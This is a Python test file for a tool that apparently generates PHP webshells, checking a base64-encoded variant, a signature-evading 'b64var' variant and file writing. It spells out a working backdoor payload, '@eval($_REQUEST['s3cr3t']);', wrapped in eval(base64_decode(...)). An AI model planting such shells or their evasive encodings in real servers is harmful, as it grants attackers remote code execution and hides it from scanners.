"""Webshell generation: well-formed PHP + evasive variants (no network)."""

import pytest

from webshell_sniper.features import generate


def test_generate_base64_shell_is_php_with_eval_body():
    src = generate.generate_webshell("s3cr3t", encoder="base64")
    assert src.startswith("<?php ")
    assert "eval(base64_decode('" in src
    # The decoded body wires $_REQUEST['s3cr3t'] to eval.
    import base64
    import re

    blob = re.search(r"base64_decode\('([^']*)'\)", src).group(1)
    assert base64.b64decode(blob).decode() == "@eval($_REQUEST['s3cr3t']);"


def test_generate_b64var_hides_signature():
    src = generate.generate_webshell("pw", encoder="b64var")
    assert "base64_decode(" not in src
    assert "eval(base64_decode(" not in src


def test_generate_rejects_unknown_encoder():
    with pytest.raises(ValueError):
        generate.generate_webshell("pw", encoder="rot13")


def test_write_webshell_creates_file(tmp_path):
    out = generate.write_webshell(tmp_path, "pw", encoder="gzip", filename="x.php")
    assert out == tmp_path / "x.php"
    assert out.read_text().startswith("<?php ")
